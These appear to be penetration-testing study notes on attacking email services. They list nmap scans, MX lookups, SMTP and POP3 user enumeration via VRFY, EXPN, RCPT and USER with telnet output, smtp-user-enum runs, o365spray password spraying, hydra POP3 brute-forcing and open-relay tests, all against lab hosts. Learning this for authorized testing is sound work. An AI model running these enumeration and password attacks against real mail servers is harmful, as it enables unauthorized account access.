#email #SMTP #POP3 #IMAP4 #o365spray #swaks #mxtoolbox #smtp-user-enum

## Common Ports

|**Port**|**Service**|
|---|---|
|`TCP/25`|SMTP Unencrypted|
|`TCP/143`|IMAP4 Unencrypted|
|`TCP/110`|POP3 Unencrypted|
|`TCP/465`|SMTP Encrypted|
|`TCP/993`|IMAP4 Encrypted|
|`TCP/995`|POP3 Encrypted|

We can use `Nmap`'s default script `-sC` option to enumerate those ports on the target system:


```
nmap -Pn -sV -sC -p25,143,110,465,993,995 10.129.14.128
```

---
## Attacking Email Services

| **Command**                                                                                                                                             | **Description**                                                                        |
| ------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------- |
| `host -t MX microsoft.com`                                                                                                                              | DNS lookup for mail servers for the specified domain.                                  |
| `dig mx inlanefreight.com \| grep "MX" \| grep -v ";"`                                                                                                  | DNS lookup for mail servers for the specified domain.                                  |
| `host -t A mail1.inlanefreight.htb.`                                                                                                                    | DNS lookup of the IPv4 address for the specified subdomain.                            |
| `telnet 10.10.110.20 25`                                                                                                                                | Connect to the SMTP server.                                                            |
| `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`                                                                           | SMTP user enumeration using the RCPT command against the specified host.               |
| `python3 o365spray.py --validate --domain msplaintext.xyz`                                                                                              | Verify the usage of Office365 for the specified domain.                                |
| `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz`                                                                                     | Enumerate existing users using Office365 on the specified domain.                      |
| `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`                                         | Password spraying against a list of users that use Office365 for the specified domain. |
| `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`                                                                                               | Brute-forcing the POP3 service.                                                        |
| `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213` | Testing the SMTP service for the open-relay vulnerability.                             |
| `nmap -p25 -Pn --script smtp-open-relay 10.10.11.213`                                                                                                   | SMTP open relay enumeration                                                            |
| `nmap -Pn -sV -sC -p25,143,110,465,993,995 10.129.14.128`                                                                                               | `Nmap` default scripts against default ports                                           |
|                                                                                                                                                         |                                                                                        |

---

| Online Resources       | Description |
| ---------------------- | ----------- |
| https://mxtoolbox.com/ | MX lookup   |
| https://shodan.io      | SMTP service search            |


---

| Tools                              | Description                                                                   |
| ---------------------------------- | ----------------------------------------------------------------------------- |
| https://github.com/0xZDH/o365spray | username enumeration and password spraying tool aimed at Microsoft Office 365 |
|                                    |                                                                               |

## SMTP User Enumeration
---
`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.

VRFY Command
```
telnet 10.10.110.20 25
```
```
Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

VRFY www-data
252 2.0.0 www-data

VRFY new-user
550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
```

---
`EXPN` is similar to `VRFY`, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the `VRFY` command since sites often have an alias such as "all."

EXPN Command
```shell-session
telnet 10.10.110.20 25
```
```
Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

EXPN john
250 2.1.0 john@inlanefreight.htb

EXPN support-team
250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

---
`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.

RCPT Command
```shell-session
telnet 10.10.110.20 25

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
220 parrot ESMTP Postfix (Debian/GNU)

MAIL FROM:test@htb.com
it is
250 2.1.0 test@htb.com... Sender ok

RCPT TO:julio
550 5.1.1 julio... User unknown

RCPT TO:kate
550 5.1.1 kate... User unknown

RCPT TO:john
250 2.1.5 john... Recipient ok
```
---

## POP3 User Enumeration
---
We can also use the `POP3` protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exists on the server.

USER command
```shell-session
telnet 10.10.110.20 110

Trying 10.10.110.20...
Connected to 10.10.110.20.
Escape character is '^]'.
+OK POP3 Server ready

USER julio
-ERR

USER john
+OK
```

---

## Automated Enumeration

To automate our enumeration process, we can use a tool named [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum). We can specify the enumeration mode with the argument `-M` followed by `VRFY`, `EXPN`, or `RCPT`, and the argument `-U` with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument `-D`. Finally, we specify the target with the argument `-t`.


User Command
```shell-session
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```
```
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... userlist.txt
Target count ............. 1
Username count ........... 78
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Apr 21 06:53:07 2022 #########
10.129.203.7: jose@inlanefreight.htb exists
10.129.203.7: pedro@inlanefreight.htb exists
10.129.203.7: kate@inlanefreight.htb exists
######## Scan completed at Thu Apr 21 06:53:18 2022 #########
3 results.

78 queries in 11 seconds (7.1 queries / sec)
```

---
